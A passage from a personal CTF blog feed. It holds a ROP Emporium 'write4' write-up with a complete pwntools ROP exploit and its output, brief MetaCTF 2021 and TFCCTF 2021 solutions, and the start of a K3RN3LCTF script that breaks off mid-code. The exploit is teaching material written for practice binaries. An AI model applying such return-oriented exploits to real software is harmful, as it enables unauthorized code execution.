first 4 bytes:</span></span><br><span class="line">$rsp   : 0x007fffffffe0a8  →  &quot;kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]&quot;</span><br><span class="line"><span class="comment">// 3. Find the offset</span></span><br><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/03_03$ cyclic -l kaaa</span><br><span class="line">40</span><br></pre></td></tr></table></figure></details><p>Use cyclic to count the offset from <code>rsp</code> (don’t need any arithmetic) and we can get the padding is <code>40.</code></p><details><summary style="display:list-item">2. Read pwnme() assembly</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">public pwnme</span><br><span class="line">pwnme proc near</span><br><span class="line"></span><br><span class="line">s= byte ptr <span class="number">-20</span>h</span><br><span class="line"></span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, <span class="number">20</span>h</span><br><span class="line">mov     rax, cs:stdout_ptr</span><br><span class="line">mov     rax, [rax]</span><br><span class="line">mov     ecx, <span class="number">0</span>          ; n</span><br><span class="line">mov     edx, <span class="number">2</span>          ; modes</span><br><span class="line">mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">mov     rdi, rax        ; stream</span><br><span class="line">call    _setvbuf</span><br><span class="line">lea     rdi, s          ; <span class="string">&quot;write4 by ROP Emporium&quot;</span></span><br><span class="line">call    _puts</span><br><span class="line">lea     rdi, aX8664     ; <span class="string">&quot;x86_64\n&quot;</span></span><br><span class="line">call    _puts</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span>  ; n</span><br><span class="line">mov     esi, <span class="number">0</span>          ; c</span><br><span class="line">mov     rdi, rax        ; s</span><br><span class="line">call    _memset</span><br><span class="line">lea     rdi, aGoAheadAndGive ; <span class="string">&quot;Go ahead and give me the input already!&quot;</span>...</span><br><span class="line">call    _puts</span><br><span class="line">lea     rdi, format     ; <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">mov     edx, <span class="number">200</span>h       ; nbytes</span><br><span class="line">mov     rsi, rax        ; buf</span><br><span class="line">mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">call    _read</span><br><span class="line">lea     rdi, aThankYou  ; <span class="string">&quot;Thank you!&quot;</span></span><br><span class="line">call    _puts</span><br><span class="line">nop</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">pwnme endp</span><br></pre></td></tr></table></figure></details><p>Look through the code from IDA Pro (which is more straightforward.)</p><ul><li>From line 32, we know that it puts <code>rax</code> (which is the buffer size) to <code>rsi.</code> And <code>rax</code> comes from line 30, which is <code>[rbp+s]</code> and <code>s</code> equals <code>0x20</code> (from line 4). Thus we know the buffer size is <code>0x20</code> bytes.</li><li>Before the return address, there lies a <code>rbp,</code> so we have to plus another 8 bytes to <code>0x20</code>. Thus, we got <code>40</code> bytes.</li></ul><p>In both ways, we can conclude that to reach the return address we have to insert <code>40</code> bytes padding.</p><p>Once we control the <code>rip</code>, we can make this binary execute anything we want!</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><details><summary style="display:list-item">Exploit code</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">padding = cyclic_find(<span class="string">&quot;kaaa&quot;</span>)</span><br><span class="line">data_address = <span class="number">0x601028</span></span><br><span class="line">writeable_addr_2 = <span class="number">0x601030</span></span><br><span class="line">pop_r14_r15 = <span class="number">0x400690</span></span><br><span class="line">r14_deref_r15 = <span class="number">0x400628</span></span><br><span class="line">pop_rdi = <span class="number">0x400693</span></span><br><span class="line">usefulFunction_adr = <span class="number">0x400620</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./write4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  1 - Fill the padding</span></span><br><span class="line">padding = <span class="string">&quot;A&quot;</span> * padding</span><br><span class="line">payload = padding.encode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 - Insert first part of file name</span></span><br><span class="line">payload += p64(pop_r14_r15)</span><br><span class="line">payload += p64(data_address)</span><br><span class="line">payload += <span class="string">b&quot;./flag.t&quot;</span></span><br><span class="line">payload += p64(r14_deref_r15)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 - Insert Second part of file name</span></span><br><span class="line"><span class="comment"># Store &quot;./flag.t&quot; to rdi</span></span><br><span class="line"><span class="comment"># Because the &quot;./flag.txt&quot; is too long, and the gadget we get can only move qword at a time (8 byte), so we have to move the string twice</span></span><br><span class="line">payload += p64(pop_r14_r15)</span><br><span class="line">payload += p64(writeable_addr_2)</span><br><span class="line">payload += <span class="string">b&quot;xt\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line"><span class="comment"># Store the &quot;xt\x00\x00\x00\x00\x00\x00&quot; string to [r14+0x8]</span></span><br><span class="line">payload += p64(r14_deref_r15)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 - Store &quot;./flag.txt&quot; adderss to rdi</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 - Evoke usefulFunction</span></span><br><span class="line">payload += p64(usefulFunction_adr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></details><p>I’ll provide some illustrations of finding the address from line 4 to line 9 in the exploit code.</p><details>    <summary style="display:list-item">1. 0x601028</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ readelf --section-headers -W ./write4 | grep data</span><br><span class="line">  [<span class="number">15</span>] .rodata           PROGBITS        <span class="number">00000000004006b</span>0 <span class="number">0006b</span>0 <span class="number">000010</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">  [<span class="number">23</span>] .data             PROGBITS        <span class="number">0000000000601028</span> <span class="number">001028</span> <span class="number">000010</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">8</span></span><br></pre></td></tr></table></figure></details><ul><li>The reason that we choose <code>.data</code> not <code>.rodata</code> is because it’s <code>WA</code>(writeable and accessible). Thus that’s how we get <code>0x601028.</code></li></ul><ol start="2"><li>0x601030 is calculated by <code>0x601028 + 0x8</code>, since the <code>./flag.txt</code> (10 bytes) is too long, and the gadget we get can only move qword (8 bytes) at a time, so we have to move the leftover after next 8 bytes.</li></ol><details><summary style="display:list-item">3. Use the usefulGadgets which is mentioned above to get 0x400628 and 0x400690 </summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ ropper -f ./write4 | grep r14</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="type">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"><span class="number">0x0000000000400628</span>: mov qword ptr [r14], r15; ret;</span><br><span class="line"><span class="number">0x0000000000400690</span>: pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure></details><ul><li>We use <code>pop r14; pop r15; ret;</code> to store the pointer and the filename respectively. Besides, <code>mov qword ptr [r14], r15; ret;</code> it first dereferences r14 and stores the value from r15 to it.</li></ul><details><summary style="display:list-item">4. 0x400693</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ ropper -f ./write4 | grep rdi</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="type">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line"><span class="number">0x0000000000400693</span>: pop rdi; ret;</span><br></pre></td></tr></table></figure></details><ul><li>It’s the gadget to store the pointer to the filename<details><summary style="display:list-item">5. 0x400620</summary></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400617</span> usefulFunction  proc near</span><br><span class="line">.text:<span class="number">0000000000400617</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400618</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 mov     edi, offset aNonexistent ; <span class="string">&quot;nonexistent&quot;</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 call    _print_file</span><br><span class="line">.text:<span class="number">0000000000400625</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000400626</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400627</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400627</span> usefulFunction  endp</span><br></pre></td></tr></table></figure></details><ul><li>Although usefulFunction starts at <code>0x400617</code>, it changes the <code>rdi</code> at <code>0x40061B</code>, which destroys our plan. Thus we decide to jump from <code>0x400620</code> and make it only call <code>_print_file</code> without changing <code>rdi.</code></li></ul><h2 id="Get-the-flag"><a href="#Get-the-flag" class="headerlink" title="Get the flag"></a>Get the flag</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">jeff14994@jeff14994-VirtualBox:~/Desktop/asu-hacking/<span class="number">03</span>_03$ python exploit.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./write4&#x27;</span>: pid <span class="number">31741</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">write4 by ROP Emporium</span><br><span class="line">x86_64</span><br><span class="line"></span><br><span class="line">Go ahead and give me the input already!</span><br><span class="line"></span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br></pre></td></tr></table></figure><p>Happy ropping!</p>]]></content>
      
      
      
        <tags>
            
            <tag> wargame </tag>
            
            <tag> 2022 </tag>
            
            <tag> rop </tag>
            
            <tag> ROP Emporium </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MetaCTF 2021</title>
      <link href="/2021/12/06/MetaCTF-2021/"/>
      <url>/2021/12/06/MetaCTF-2021/</url>
      
        <content type="html"><![CDATA[<p><a href="https://jeff14994.github.io/2021/12/06/MetaCTF-2021/#Fun" target="_self">TL;DR Just jump to the conclusion at last part if you think this write-up is too lengthy →</a></p><h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><h2 id="Thnks-fr-th-Pwds"><a href="#Thnks-fr-th-Pwds" class="headerlink" title="Thnks fr th Pwds"></a><code>Thnks fr th Pwds</code></h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><p><img src="https://hackmd.io/_uploads/B1loWvhFY.jpg"><br><a href="https://jeff14994.github.io/2021/12/06/MetaCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><ul><li>It seems to be encoded as base64, so I decoded it in the following command<ul><li><code>echo &quot;TWV0YUNURntlbmNvZGluZ19pc19OMFRfdGhlX3NhbWVfYXNfZW5jcnlwdGlvbiEhfQ==&quot; | base64 -d</code></li><li><img src="https://hackmd.io/_uploads/Bko7zDhFF.jpg"><h3 id="Got-flag"><a href="#Got-flag" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>MetaCTF&#123;encoding_is_N0T_the_same_as_encryption!!&#125;</code><h2 id="Wrong-Way-on-a-One-Way-Street"><a href="#Wrong-Way-on-a-One-Way-Street" class="headerlink" title="Wrong Way on a One Way Street"></a><code>Wrong Way on a One Way Street</code></h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/rysjMv2YY.jpg"></li><li>Find the hash with online <a href="https://crackstation.net/">cracking tools</a> and get:<ul><li><img src="https://hackmd.io/_uploads/HyUe7vhtY.jpg"><h3 id="Got-flag-1"><a href="#Got-flag-1" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>MetaCTF&#123;babyloka13&#125;</code><h2 id="Size-Matters"><a href="#Size-Matters" class="headerlink" title="Size Matters"></a><code>Size Matters</code></h2><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/ryrq7w3tY.jpg"></li><li>Find the RSA with online <a href="https://www.dcode.fr/rsa-cipher">cracking tools</a> and get:<ul><li><img src="https://hackmd.io/_uploads/rkGxEw3YF.jpg"><h3 id="Got-flag-2"><a href="#Got-flag-2" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>MetaCTF&#123;you_broke_rsa!&#125;</code><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Magic-in-the-Hex"><a href="#Magic-in-the-Hex" class="headerlink" title="Magic in the Hex"></a><code>Magic in the Hex</code></h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/Sk5SNPnYK.jpg"></li><li>Found the magic number of the <code>VMDK</code> file by <a href="https://filesignatures.net/index.php?page=search&search=VMDK&mode=EXT">googling</a><ul><li><img src="https://hackmd.io/_uploads/ByOKNv2FF.jpg"></li></ul></li></ul><h3 id="Got-flag-3"><a href="#Got-flag-3" class="headerlink" title="Got flag:"></a>Got flag:</h3><ul><li><code>KDM</code><h2 id="Sharing-Files-and-Passwords"><a href="#Sharing-Files-and-Passwords" class="headerlink" title="Sharing Files and Passwords"></a><code>Sharing Files and Passwords</code></h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/BJMhNP3FK.jpg"></li><li>Download the <code>pcap</code> file and filter the FTP protocol and the password revealed<ul><li><img src="https://hackmd.io/_uploads/HkszSD3Kt.jpg"><h3 id="Got-flag-4"><a href="#Got-flag-4" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>METACTF&#123;ftp_is_better_than_dropbox&#125;</code><h2 id="Still-Believe-in-Magic"><a href="#Still-Believe-in-Magic" class="headerlink" title="Still Believe in Magic?"></a><code>Still Believe in Magic?</code></h2><h3 id="Description-5"><a href="#Description-5" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/r1qLBvnKF.jpg"></li><li>Got a file, and when <code>file magic.tar.gz</code>, We got:  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic.tar.gz: gzip compressed data, last modified: Fri Dec  3 16:51:29 2021, from Unix, original size modulo 2^32 10240</span><br></pre></td></tr></table></figure><ul><li>It seems the flag is compressed in two kinds of methods (<code>.tar</code> and <code>.gz</code>), so we have to decompress it.<ul><li>So first, I used <code>gzip -d magic.tar.gz</code> to get <code>magic.tar.</code></li><li>And then, I used <code>tar -xf magic.tar</code> to get <code>magic.</code><ul><li>from <code>file magic</code>, we can know <code>magic: Zip archive data, at least v2.0 to extract.</code></li></ul></li><li>Lastly, I used <code>unzip magic</code> to get the magic file <ul><li><img src="https://hackmd.io/_uploads/ryqcy_3tY.jpg"></li></ul></li><li><code>cat flag</code><ul><li><img src="https://hackmd.io/_uploads/rkmlxunFY.jpg"><h3 id="Got-flag-5"><a href="#Got-flag-5" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li></ul></li></ul></li><li><code>MetaCTF&#123;was_it_a_magic_trick_or_magic_bytes?&#125;</code><h3 id="Referece"><a href="#Referece" class="headerlink" title="Referece"></a>Referece</h3></li><li><a href="https://help.nexcess.net/77285-other/how-to-decompress-files-in-gzip">How to decompress files in gzip</a></li><li><a href="https://linuxize.com/post/how-to-extract-unzip-tar-gz-file/">How to decompress files in tar</a><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><h2 id="This-Ain-39-t-a-Scene-It-39-s-an-Encryption-Race"><a href="#This-Ain-39-t-a-Scene-It-39-s-an-Encryption-Race" class="headerlink" title="This Ain&#39;t a Scene, It&#39;s an Encryption Race"></a><code>This Ain&#39;t a Scene, It&#39;s an Encryption Race</code></h2><h3 id="Description-6"><a href="#Description-6" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/r1RIUwnKF.jpg"></li><li>Find the Mitre ATT&amp;CK technique ID for the encryption of data by <a href="https://attack.mitre.org/techniques/T1486/">googling</a><ul><li><img src="https://hackmd.io/_uploads/rJQ6LD2Yt.jpg"><h3 id="Got-flag-6"><a href="#Got-flag-6" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>T1486</code><h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h1><h2 id="Sugar-We-39-re-Goin-Up"><a href="#Sugar-We-39-re-Goin-Up" class="headerlink" title="Sugar, We&#39;re Goin Up"></a><code>Sugar, We&#39;re Goin Up</code></h2><h3 id="Description-7"><a href="#Description-7" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/Hk60UPnFt.jpg"></li><li>Found that by <a href="https://www.rapid7.com/blog/post/2021/11/01/gitlab-unauthenticated-remote-code-execution-cve-2021-22205-exploited-in-the-wild/">googling</a><ul><li><img src="https://hackmd.io/_uploads/SykSdD2FY.jpg"> <h3 id="Got-flag-7"><a href="#Got-flag-7" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>CVE-2021-22205</code><h2 id="The-Best-Laid-Plans"><a href="#The-Best-Laid-Plans" class="headerlink" title="The Best Laid Plans..."></a><code>The Best Laid Plans...</code></h2><h3 id="Description-8"><a href="#Description-8" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/rJMMwD2YF.jpg"></li><li>Found that by <a href="https://www.armis.com/blog/from-urgent11-to-frag44-microsoft-patches-critical-vulnerabilities-in-windows-tcpip-stack/">googling</a><ul><li><img src="https://hackmd.io/_uploads/BJe2dPhYK.jpg"><h3 id="Got-flag-8"><a href="#Got-flag-8" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>MetaCTF&#123;Ipv4pReceiveRoutingHeader&#125;</code><h2 id="Who-Broke-the-Printer-This-Time"><a href="#Who-Broke-the-Printer-This-Time" class="headerlink" title="Who Broke the Printer This Time?"></a><code>Who Broke the Printer This Time?</code></h2><h3 id="Description-9"><a href="#Description-9" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/SJU4vDnFK.jpg"></li><li>Found that by <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">googling</a><ul><li><img src="https://hackmd.io/_uploads/HyIWFw3YF.jpg"><h3 id="Got-flag-9"><a href="#Got-flag-9" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li><li><code>CVE-2021-34527</code><h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><h2 id="Under-Inspection"><a href="#Under-Inspection" class="headerlink" title="Under Inspection"></a><code>Under Inspection</code></h2><h3 id="Description-10"><a href="#Description-10" class="headerlink" title="Description:"></a>Description:</h3><img src="https://hackmd.io/_uploads/SJvPvPhYY.jpg"></li><li>There is an easy login-page<ul><li><img src="https://hackmd.io/_uploads/B15mYwnYF.jpg"></li></ul></li><li>I try to look around the <code>Network</code> by Developer’s tools and find something interesting:<ul><li><img src="https://hackmd.io/_uploads/HkdctvhFF.png"><ul><li>From the code, you can tell that if <code>username == &quot;Jazz&quot;</code>, the flag will return, so I did.</li><li>Actually, the password is the flag<h3 id="Got-flag-10"><a href="#Got-flag-10" class="headerlink" title="Got flag:"></a>Got flag:</h3></li></ul></li></ul></li><li><code>MetaCTF&#123;do_it_with_style_or_dont_do_it_at_all&#125;</code><h1 id="Conclusion-for-this-semester-ASU-CSE-466"><a href="#Conclusion-for-this-semester-ASU-CSE-466" class="headerlink" title="Conclusion for this semester (ASU CSE 466)"></a>Conclusion for this semester (ASU CSE 466)</h1><h3 id="Fun"><a href="#Fun" class="headerlink" title="Fun"></a>Fun</h3></li><li>Although this is the last CTF game playing with the team <a href="https://ctftime.org/team/162814"><code>ToInfinityAndBeYANd</code></a>, I had a lot of fun. Thank you all for playing CTF with me this semester. Plus, thank you Yan for providing this great opportunity for us to play CTF this whole semester. Have a lot of fun. Thanks! I’ll keep pushing until I get the yellow belt (even the blue belt)! LOL<br><img src="https://hackmd.io/_uploads/HysIqw3YF.jpg"><h3 id="Shout-out-to-all-the-teammates"><a href="#Shout-out-to-all-the-teammates" class="headerlink" title="Shout out to all the teammates!"></a>Shout out to all the teammates!</h3><img src="https://hackmd.io/_uploads/SJE9iD3FF.jpg"><h3 id="We-had-a-team-called-Hacker-in-discord"><a href="#We-had-a-team-called-Hacker-in-discord" class="headerlink" title="We had a team called Hacker in discord"></a>We had a team called <code>Hacker</code> in discord</h3></li><li><img src="https://hackmd.io/_uploads/SyynivhtY.jpg"></li></ul><h3 id="I-solved-11-challenges-quite-a-fun-one"><a href="#I-solved-11-challenges-quite-a-fun-one" class="headerlink" title="I solved 11 challenges, quite a fun one"></a>I solved 11 challenges, quite a fun one</h3><ul><li><img src="https://hackmd.io/_uploads/rk0RxwnYY.jpg"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TFCCTF 2021</title>
      <link href="/2021/11/28/TFCCTF-2021/"/>
      <url>/2021/11/28/TFCCTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="HOLIDAY"><a href="#HOLIDAY" class="headerlink" title="HOLIDAY"></a><code>HOLIDAY</code></h2><p><img src="https://i.imgur.com/xIHIBLB.jpg"><br><a href="https://jeff14994.github.io/2021/11/28/TFCCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><ul><li>Got a string that’s written in some language which is hard to recongnize : <code>Maui: mai hele mai i kēia lā aia nā ʻīlio</code></li><li>Simply threw this string to Google Translation (and found out it’s Hawaiian language )<ul><li><img src="https://i.imgur.com/Bqk9sWS.jpg"></li></ul></li><li>Combined the hint from the host:<ul><li><img src="https://i.imgur.com/VCHtP8l.png"></li></ul></li></ul><h3 id="Got-flag"><a href="#Got-flag" class="headerlink" title="Got flag:"></a>Got flag:</h3><ul><li><code>TFCCTF&#123;don&#39;t_come_today_there_are_dogs&#125;</code><h2 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a><code>SEA LANGUAGE 1</code></h2><img src="https://i.imgur.com/f5Qz0z9.png"><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3></li><li>Got a file: <code>slt.txt.</code><ul><li>When opening the file, it is shown as below:<br>  <img src="https://i.imgur.com/xXgwAPg.jpg"></li><li>At first glance, seeing there are <code>.</code> and <code>-</code> in there. Two thoughts came into mind.<ul><li>One is Morse code</li><li>The other is binary (0 and 1)</li></ul></li><li>Attempted to solve that with Morse code first, and thus threw the message to <a href="https://morsecode.world/international/translator.html">Morse Code Translator</a>. Got lucky to get printable ASCII characters on the first try.<br>  <img src="https://i.imgur.com/REYTrcs.jpg"></li></ul></li></ul><h3 id="Got-flag-1"><a href="#Got-flag-1" class="headerlink" title="Got flag:"></a>Got flag:</h3><ul><li><code>TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125;</code> <h2 id="Result"><a href="#Result" class="headerlink" title="Result:"></a>Result:</h2><img src="https://i.imgur.com/AuYsSNu.jpg"></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K3RN3LCTF 2021</title>
      <link href="/2021/11/15/K3RN3LCTF-2021/"/>
      <url>/2021/11/15/K3RN3LCTF-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="Kiddie-Pool"><a href="#Kiddie-Pool" class="headerlink" title="Kiddie Pool"></a>Kiddie Pool</h1><h2 id="Vieta-39-s-Poly"><a href="#Vieta-39-s-Poly" class="headerlink" title="Vieta&#39;s Poly"></a><code>Vieta&#39;s Poly</code></h2><p><img src="https://i.imgur.com/8BLS9MG.jpg"><br><a href="https://jeff14994.github.io/2021/11/15/K3RN3LCTF-2021/" target="_self">Read More →</a></p><span id="more"></span><h3 id="Python-Code"><a href="#Python-Code" class="headerlink" title="Python Code:"></a>Python Code:</h3><ul><li>You have to solve 100 math problems to get the flag<ul><li>There are three types of math problems<ol><li>sum of the roots</li><li>sum of the reciprocals of the roots</li><li>sum of the squares of the roots<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">port = <span class="number">2236</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27; #will print all input and output for debugging purposes</span></span><br><span class="line">conn = remote(<span class="string">&quot;ctf.k3rn3l4rmy.com&quot;</span>,port) <span class="comment">#enter the address and the port here as strings. For example nc 0.0.0.0 5000 turns into remote(&#x27;0.0.0.0&#x27;, 5000)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input</span>(): <span class="comment">#function to get one line from the netcat</span></span><br><span class="line">    <span class="built_in">input</span> = conn.recvline().strip().decode()</span><br><span class="line">    <span class="keyword">return</span> <span 